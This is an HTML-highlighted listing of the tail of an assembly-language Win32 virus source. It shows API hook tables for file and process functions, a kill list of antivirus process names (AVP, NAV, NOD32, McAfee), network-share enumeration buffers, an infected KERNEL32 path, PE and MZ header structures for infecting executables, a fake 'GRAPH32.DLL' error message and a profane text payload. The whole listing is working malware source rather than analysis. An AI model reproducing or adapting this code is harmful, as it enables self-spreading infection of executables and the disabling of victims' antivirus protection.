        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_CopyFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_CreateFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_CreateProcessA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_DeleteFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_GetFileAttributesA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_MoveFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_MoveFileExA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_SetFileAttributesA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc1">; Unicode.</span><span class="sc0">

        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_CopyFileW</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_CreateFileW</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_CreateProcessW</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_DeleteFileW</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_GetFileAttributesW</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_MoveFileW</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_MoveFileExW</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Hook_SetFileAttributesW</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">; McAfee, AVP, NAV, and NOD-Ice.</span><span class="sc0">
</span><span class="sc5">Kill_Table</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">_AVP32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">_AVPCC.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">_AVPM.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">ALERTSVC.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">AMON.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">AVP32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">AVPCC.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">AVPM.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">N32SCANW.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NAVAPSVC.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NAVAPW32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NAVLU32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NAVRUNR.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NAVW32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NAVWNT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NOD32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NPSSVC.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NRESQ32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NSCHED32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NSCHEDNT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">NSPLUGIN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">SCAN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">SMSS.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">End_Kill_Table</span><span class="sc4">:</span><span class="sc0">


    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'YOU CALL IT RELIGION, YOU''RE FULL OF SHIT'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'YOU NEVER KNEW, YOU NEVER DID, YOU NEVER WILL'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'YOU''RE SO FULL OF SHIT, I DON''T WANT TO HEAR IT'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'ALL YOU DO IS TALK ABOUT YOURSELF'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'I DON''T WANNA HEAR IT, COZ I KNOW NONE OF IT''S TRUE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'I''M SICK AND TIRED OF ALL YOUR GODDAMN LIES'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'LIES IN THE NAME OF GOD'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WHEN ARE YOU GOING TO REALIZE THAT I DON''T WANT TO HEAR IT?!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'I KNOW YOU''RE SO FULL OF SHIT, SO SHUT YOUR FUCKING MOUTH'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'YOU KEEP ON TALKING, TALKING EVERYDAY'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'FIRST YOU''RE TELLING STORIES, THEN YOU''RE TELLING LIES'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WHEN THE FUCK ARE YOU GOING TO REALIZE THAT I DON''T WANT TO HEAR IT!!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'AH, SHUT THE FUCK UP...'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Virus_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Kill_List_Drives</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Net_Resource</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Clean_K32_Path</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Infected_K32_Path</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ANSI_Target_File</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Time_Creation</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WNetOpenEnumA</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Time_Last_Access</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WNetEnumResourceA</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Time_Last_Write</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Local_Time</span><span class="sc0">              </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">End_Heap</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">Stupid_Dummy</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">POLY_START</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; This is where the host's</span><span class="sc0">
                        </span><span class="sc1">; VA address is placed.</span><span class="sc0">

        </span><span class="sc6">PUSHFD</span><span class="sc0">                          </span><span class="sc1">; Save all registers &amp; flags.</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@16</span><span class="sc0">                     </span><span class="sc1">; Check for presence of my</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'C:\VIRUS.TIR'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; innoculation-file, as I</span><span class="sc0">
</span><span class="sc5">@16</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetFileAttributesA</span><span class="sc0">      </span><span class="sc1">; run Soft-Ice myself.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Nah it ain't T, so let's</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">START</span><span class="sc0">                   </span><span class="sc1">; go for it.</span><span class="sc0">

                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">                     </span><span class="sc1">; Ack, we can't hurt daddy.</span><span class="sc0">

                </span><span class="sc6">NOP</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">Carrier</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@17</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Error!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@17</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@18</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Failed to initialize GRAPH32.DLL'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@18</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; Back to the beast...</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">


</span><span class="sc1">; The good old MZ-header...</span><span class="sc0">

</span><span class="sc5">MZ_Header</span><span class="sc0">               </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">MZ_Mark</span><span class="sc0">                 </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Image_Mod_512</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Image_512_Pages</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Reloc_Items</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Header_Size_Mem</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Min_Size_Mem</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Max_Size_Mem</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Program_SS</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Program_SP</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Checksum</span><span class="sc0">             </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Program_IP</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Program_CS</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Reloc_Table</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Header</span><span class="sc0">               </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">PE_Header</span><span class="sc0">               </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">PE_Mark</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; PE-marker (PE/0/0).</span><span class="sc0">
</span><span class="sc5">CPU_Type</span><span class="sc0">                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Minimal CPU required.</span><span class="sc0">
</span><span class="sc5">Object_Count</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Number of sections in PE.</span><span class="sc0">
</span><span class="sc5">PE_Date_Time</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Date/time PE was build.</span><span class="sc0">
</span><span class="sc5">Reserved_1</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NT_Header_Size</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PE_Flags</span><span class="sc0">                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">EIP_RVA</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Image_Base</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Object_Align</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Align</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PE_Reserved_5</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Image_Size</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Headers_Size</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PE_Checksum</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DLL_Flags</span><span class="sc0">               </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PE_Header</span><span class="sc0">               </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Section_Header</span><span class="sc0">          </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Section_Name</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Zero-padded section-name.</span><span class="sc0">
</span><span class="sc5">Section_Virtual_Size</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Memory-size of section.</span><span class="sc0">
</span><span class="sc5">Section_RVA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Start section in memory.</span><span class="sc0">
</span><span class="sc5">Section_Physical_Size</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Section-size in file.</span><span class="sc0">
</span><span class="sc5">Section_Physical_Offset</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Section file-offset.</span><span class="sc0">
</span><span class="sc5">Section_Reserved_1</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Not used for executables.</span><span class="sc0">
</span><span class="sc5">Section_Reserved_2</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Not used for executables.</span><span class="sc0">
</span><span class="sc5">Section_Reserved_3</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Not used for executables.</span><span class="sc0">
</span><span class="sc5">Section_Flags</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Flags of the section.</span><span class="sc0">
</span><span class="sc5">Section_Header</span><span class="sc0">          </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Find_First_Next_Win32</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">File_Attributes</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Creation_Time</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Last_Accessed_Time</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Last_Written_Time</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_File_Size_High</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_File_Size_Low</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_Reserved_1</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_Reserved_2</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FFN_File_Name</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Find_DOS_File_Name</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Find_First_Next_Win32</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Date_Time</span><span class="sc0">               </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Current_Year</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Month</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Day_Of_Week</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Day</span><span class="sc0">             </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Hour</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Minute</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Second</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Millisecond</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Date_Time</span><span class="sc0">               </span><span class="sc9">ENDS</span><span class="sc0">

        </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">POLY_START</span><span class="sc0">
</span></div></body>
</html>
